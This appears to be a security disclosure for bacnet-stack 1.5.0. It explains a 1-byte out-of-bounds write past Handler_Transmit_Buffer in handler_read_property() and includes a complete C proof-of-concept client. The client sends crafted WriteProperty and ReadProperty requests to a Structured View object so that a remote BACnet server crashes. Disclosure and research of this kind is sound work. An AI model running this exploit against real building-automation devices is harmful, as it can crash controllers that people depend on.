@@ -1,0 +1,395 @@
+issue #1398
+
+Summary
+
+In bacnet-stack 1.5.0 (master branch commit 932e347), handler_read_property() does not reserve space for the final closing tag when constructing a ReadProperty-ACK. This can result in a 1-byte out-of-bounds write past the global Handler_Transmit_Buffer.
+
+The issue is remotely reachable through the normal BACnet server path. On a server that exposes ReadProperty and WriteProperty and includes a writable Structured View object, a client can modify PROP_SUBORDINATE_ANNOTATIONS and then issue ReadProperty(..., BACNET_ARRAY_ALL) to reach the vulnerable path.
+
+Relevant logic:
+
+handler_read_property() first writes the ACK header and opening tag via rp_ack_encode_apdu_init().
+It then sets:
+rpdata.application_data_len =
+    sizeof(Handler_Transmit_Buffer) - (npdu_len + apdu_len);
+This gives the property-value encoding path all remaining space in Handler_Transmit_Buffer.
+Device_Read_Property() then dispatches to the object-specific read callback.
+For OBJECT_STRUCTURED_VIEW and PROP_SUBORDINATE_ANNOTATIONS, the path is:
+handler_read_property()
+  -> Device_Read_Property()
+    -> Structured_View_Read_Property(PROP_SUBORDINATE_ANNOTATIONS)
+      -> bacnet_array_encode()
+If the array contents make the encoded property-value length exactly equal to rpdata.application_data_len, handler_read_property() still executes:
+len = rp_ack_encode_apdu_object_property_end(
+    &Handler_Transmit_Buffer[npdu_len + apdu_len]);
+rp_ack_encode_apdu_object_property_end() further calls:
+return encode_closing_tag(apdu, 3);
+This performs a 1-byte write immediately past the end of Handler_Transmit_Buffer.
+
+PoC
+
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+/* BACnet Stack defines - first */
+#include "bacnet/bacdef.h"
+
+/* BACnet Stack API */
+#include "bacnet/apdu.h"
+#include "bacnet/bacdcode.h"
+#include "bacnet/bacstr.h"
+#include "bacnet/bactext.h"
+#include "bacnet/npdu.h"
+#include "bacnet/rp.h"
+
+/* basic services / client helpers */
+#include "bacnet/basic/binding/address.h"
+#include "bacnet/basic/npdu/h_npdu.h"
+#include "bacnet/basic/object/device.h"
+#include "bacnet/basic/service/h_apdu.h"
+#include "bacnet/basic/service/h_iam.h"
+#include "bacnet/basic/service/h_noserv.h"
+#include "bacnet/basic/service/h_whois.h"
+#include "bacnet/basic/service/s_rp.h"
+#include "bacnet/basic/service/s_whois.h"
+#include "bacnet/basic/service/s_wp.h"
+#include "bacnet/basic/tsm/tsm.h"
+#include "bacnet/datalink/datalink.h"
+#include "bacnet/datalink/dlenv.h"
+
+static uint8_t Rx_Buf[MAX_MPDU] = { 0 };
+static uint32_t Target_Device_Instance = BACNET_MAX_INSTANCE;
+static uint32_t Target_Structured_View_Instance = 0;
+static BACNET_ADDRESS Target_Address = { 0 };
+static uint8_t Request_Invoke_ID = 0;
+static bool Request_Acked = false;
+static bool Request_Failed = false;
+static int Read_Property_Ack_Len = -1;
+
+static void WritePropertySimpleAckHandler(BACNET_ADDRESS *src, uint8_t invoke_id)
+{
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        Request_Acked = true;
+    }
+}
+
+static void ReadPropertyAckHandler(
+    uint8_t *service_request,
+    uint16_t service_len,
+    BACNET_ADDRESS *src,
+    BACNET_CONFIRMED_SERVICE_ACK_DATA *service_data)
+{
+    BACNET_READ_PROPERTY_DATA data = { 0 };
+    int len = 0;
+
+    if (!address_match(&Target_Address, src) ||
+        (service_data->invoke_id != Request_Invoke_ID)) {
+        return;
+    }
+    len = rp_ack_decode_service_request(service_request, service_len, &data);
+    if (len < 0) {
+        Request_Failed = true;
+        return;
+    }
+    Read_Property_Ack_Len = data.application_data_len;
+    Request_Acked = true;
+}
+
+static void ErrorHandler(
+    BACNET_ADDRESS *src,
+    uint8_t invoke_id,
+    BACNET_ERROR_CLASS error_class,
+    BACNET_ERROR_CODE error_code)
+{
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        fprintf(stderr, "BACnet Error: %s / %s\n",
+            bactext_error_class_name(error_class),
+            bactext_error_code_name(error_code));
+        Request_Failed = true;
+    }
+}
+
+static void AbortHandler(
+    BACNET_ADDRESS *src, uint8_t invoke_id, uint8_t abort_reason, bool server)
+{
+    (void)server;
+
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        fprintf(stderr, "BACnet Abort: %s\n",
+            bactext_abort_reason_name((int)abort_reason));
+        Request_Failed = true;
+    }
+}
+
+static void RejectHandler(
+    BACNET_ADDRESS *src, uint8_t invoke_id, uint8_t reject_reason)
+{
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        fprintf(stderr, "BACnet Reject: %s\n",
+            bactext_reject_reason_name((int)reject_reason));
+        Request_Failed = true;
+    }
+}
+
+static void InitHandlers(void)
+{
+    Device_Init(NULL);
+    apdu_set_unconfirmed_handler(SERVICE_UNCONFIRMED_WHO_IS, handler_who_is);
+    apdu_set_unconfirmed_handler(SERVICE_UNCONFIRMED_I_AM, handler_i_am_bind);
+    apdu_set_unrecognized_service_handler_handler(handler_unrecognized_service);
+    apdu_set_confirmed_simple_ack_handler(
+        SERVICE_CONFIRMED_WRITE_PROPERTY, WritePropertySimpleAckHandler);
+    apdu_set_confirmed_ack_handler(
+        SERVICE_CONFIRMED_READ_PROPERTY, ReadPropertyAckHandler);
+    apdu_set_error_handler(SERVICE_CONFIRMED_WRITE_PROPERTY, ErrorHandler);
+    apdu_set_error_handler(SERVICE_CONFIRMED_READ_PROPERTY, ErrorHandler);
+    apdu_set_abort_handler(AbortHandler);
+    apdu_set_reject_handler(RejectHandler);
+}
+
+static void Pump(time_t *last_seconds)
+{
+    BACNET_ADDRESS src = { 0 };
+    uint16_t pdu_len = 0;
+    time_t current_seconds = 0;
+
+    pdu_len = datalink_receive(&src, &Rx_Buf[0], MAX_MPDU, 100);
+    if (pdu_len) {
+        npdu_handler(&src, &Rx_Buf[0], pdu_len);
+    }
+    current_seconds = time(NULL);
+    if (current_seconds != *last_seconds) {
+        tsm_timer_milliseconds(
+            (uint16_t)((current_seconds - *last_seconds) * 1000));
+        datalink_maintenance_timer(
+            (uint16_t)(current_seconds - *last_seconds));
+        *last_seconds = current_seconds;
+    }
+}
+
+typedef enum {
+    WAIT_STATUS_ACKED,
+    WAIT_STATUS_FAILED,
+    WAIT_STATUS_TIMEOUT
+} WAIT_STATUS;
+
+static WAIT_STATUS WaitForResult(time_t *last_seconds, uint8_t invoke_id)
+{
+    time_t deadline = time(NULL) + 10;
+
+    for (;;) {
+        Pump(last_seconds);
+        if (Request_Acked && tsm_invoke_id_free(invoke_id)) {
+            return WAIT_STATUS_ACKED;
+        }
+        if (Request_Failed) {
+            if (!tsm_invoke_id_free(invoke_id)) {
+                tsm_free_invoke_id(invoke_id);
+            }
+            return WAIT_STATUS_FAILED;
+        }
+        if (tsm_invoke_id_failed(invoke_id)) {
+            tsm_free_invoke_id(invoke_id);
+            return WAIT_STATUS_TIMEOUT;
+        }
+        if (time(NULL) >= deadline) {
+            if (!tsm_invoke_id_free(invoke_id)) {
+                tsm_free_invoke_id(invoke_id);
+            }
+            return WAIT_STATUS_TIMEOUT;
+        }
+    }
+}
+
+static void ResetRequestState(void)
+{
+    Request_Acked = false;
+    Request_Failed = false;
+    Read_Property_Ack_Len = -1;
+}
+
+static bool BindTarget(time_t *last_seconds)
+{
+    unsigned max_apdu = 0;
+    time_t deadline = 0;
+
+    Send_WhoIs(Target_Device_Instance, Target_Device_Instance);
+    deadline = time(NULL) + 10;
+    while ((time(NULL) < deadline) &&
+           !address_bind_request(
+               Target_Device_Instance, &max_apdu, &Target_Address)) {
+        Pump(last_seconds);
+    }
+
+    return address_bind_request(
+        Target_Device_Instance, &max_apdu, &Target_Address);
+}
+
+static uint8_t SendWriteUnsigned(
+    uint32_t device_id,
+    BACNET_OBJECT_TYPE object_type,
+    uint32_t object_instance,
+    BACNET_PROPERTY_ID property,
+    uint32_t array_index,
+    BACNET_UNSIGNED_INTEGER value)
+{
+    uint8_t application_data[MAX_APDU] = { 0 };
+    int application_data_len = 0;
+
+    application_data_len = encode_application_unsigned(application_data, value);
+    return Send_Write_Property_Request_Data(
+        device_id, object_type, object_instance, property, application_data,
+        application_data_len, BACNET_NO_PRIORITY, array_index);
+}
+
+static uint8_t SendWriteString(
+    uint32_t device_id,
+    BACNET_OBJECT_TYPE object_type,
+    uint32_t object_instance,
+    BACNET_PROPERTY_ID property,
+    uint32_t array_index,
+    const char *value)
+{
+    uint8_t application_data[MAX_APDU] = { 0 };
+    BACNET_CHARACTER_STRING char_string = { 0 };
+    int application_data_len = 0;
+
+    if (!characterstring_init_ansi(&char_string, value)) {
+        return 0;
+    }
+    application_data_len =
+        encode_application_character_string(application_data, &char_string);
+
+    return Send_Write_Property_Request_Data(
+        device_id, object_type, object_instance, property, application_data,
+        application_data_len, BACNET_NO_PRIORITY, array_index);
+}
+
+int main(int argc, char *argv[])
+{
+    time_t last_seconds = 0;
+    size_t annotation_count = 742;
+    const char *special_value = "BBBB";
+    WAIT_STATUS wait_status;
+
+    if (argc < 3) {
+        fprintf(
+            stderr,
+            "usage: %s <device-instance> <structured-view-instance>\n",
+            argv[0]);
+        fprintf(stderr, "example: %s 260001 1\n", argv[0]);
+        return 1;
+    }
+
+    Target_Device_Instance = strtoul(argv[1], NULL, 0);
+    Target_Structured_View_Instance = strtoul(argv[2], NULL, 0);
+    printf("[*] using fixed layout: %zu annotations\n", annotation_count);
+    printf("[*] layout detail: %zu empty + final \"%s\"\n",
+        annotation_count - 1, special_value);
+
+    address_init();
+    InitHandlers();
+    dlenv_init();
+    atexit(datalink_cleanup);
+
+    last_seconds = time(NULL);
+    if (!BindTarget(&last_seconds)) {
+        fprintf(stderr, "[-] bind target failed\n");
+        return 1;
+    }
+
+    printf("[+] bound target device %lu structured-view %lu\n",
+        (unsigned long)Target_Device_Instance,
+        (unsigned long)Target_Structured_View_Instance);
+
+    ResetRequestState();
+    Request_Invoke_ID = SendWriteUnsigned(
+        Target_Device_Instance, OBJECT_STRUCTURED_VIEW,
+        Target_Structured_View_Instance, PROP_SUBORDINATE_ANNOTATIONS, 0, 0);
+    if (!Request_Invoke_ID) {
+        fprintf(stderr, "[-] failed to send clear WriteProperty request\n");
+        return 1;
+    }
+    printf("[*] clearing subordinate annotations\n");
+    wait_status = WaitForResult(&last_seconds, Request_Invoke_ID);
+    if (wait_status != WAIT_STATUS_ACKED) {
+        fprintf(stderr, "[-] clear WriteProperty did not succeed\n");
+        return 1;
+    }
+    printf("[+] clear WriteProperty acked\n");
+
+    ResetRequestState();
+    Request_Invoke_ID = SendWriteUnsigned(
+        Target_Device_Instance, OBJECT_STRUCTURED_VIEW,
+        Target_Structured_View_Instance, PROP_SUBORDINATE_ANNOTATIONS, 0,
+        annotation_count);
+    if (!Request_Invoke_ID) {
+        fprintf(stderr, "[-] failed to send resize WriteProperty request\n");
+        return 1;
+    }
+    printf("[*] resizing subordinate annotations to %zu\n", annotation_count);
+    wait_status = WaitForResult(&last_seconds, Request_Invoke_ID);
+    if (wait_status != WAIT_STATUS_ACKED) {
+        fprintf(stderr, "[-] resize WriteProperty did not succeed\n");
+        return 1;
+    }
+    printf("[+] resize WriteProperty acked\n");
+
+    ResetRequestState();
+    Request_Invoke_ID = SendWriteString(
+        Target_Device_Instance, OBJECT_STRUCTURED_VIEW,
+        Target_Structured_View_Instance, PROP_SUBORDINATE_ANNOTATIONS,
+        (uint32_t)annotation_count, special_value);
+    if (!Request_Invoke_ID) {
+        fprintf(stderr, "[-] failed to send final annotation WriteProperty request\n");
+        return 1;
+    }
+    printf("[*] writing final annotation at index %zu = \"%s\"\n",
+        annotation_count, special_value);
+    wait_status = WaitForResult(&last_seconds, Request_Invoke_ID);
+    if (wait_status != WAIT_STATUS_ACKED) {
+        fprintf(stderr, "[-] final annotation WriteProperty did not succeed\n");
+        return 1;
+    }
+    printf("[+] final annotation WriteProperty acked\n");
+
+    ResetRequestState();
+    Request_Invoke_ID = Send_Read_Property_Request(
+        Target_Device_Instance, OBJECT_STRUCTURED_VIEW,
+        Target_Structured_View_Instance, PROP_SUBORDINATE_ANNOTATIONS,
+        BACNET_ARRAY_ALL);
+    if (!Request_Invoke_ID) {
+        fprintf(stderr, "[-] failed to send trigger ReadProperty request\n");
+        return 1;
+    }
+    printf("[*] sent trigger ReadProperty for subordinate-annotations (all)\n");
+    wait_status = WaitForResult(&last_seconds, Request_Invoke_ID);
+    if (wait_status == WAIT_STATUS_ACKED) {
+        printf("[!] received ReadProperty-ACK with %d application bytes\n",
+            Read_Property_Ack_Len);
+        printf("[!] target stayed alive; bug did not trigger on this run\n");
+        return 1;
+    }
+    if (wait_status == WAIT_STATUS_FAILED) {
+        fprintf(stderr, "[-] target returned BACnet error/abort/reject\n");
+        return 1;
+    }
+
+    printf("[+] no ReadProperty-ACK received before timeout\n");
+    printf("[+] target likely crashed before completing the ACK path\n");
+
+    return 0;
+}
+
+The PoC targets OBJECT_STRUCTURED_VIEW, instance 1, and performs the following three requests:
+
+Write PROP_SUBORDINATE_ANNOTATIONS[0] = 0
+Write PROP_SUBORDINATE_ANNOTATIONS[0] = 742
+Write PROP_SUBORDINATE_ANNOTATIONS[742] = "BBBB"
+The PoC then sends:
+
+ReadProperty(OBJECT_STRUCTURED_VIEW, 1, PROP_SUBORDINATE_ANNOTATIONS, BACNET_ARRAY_ALL)
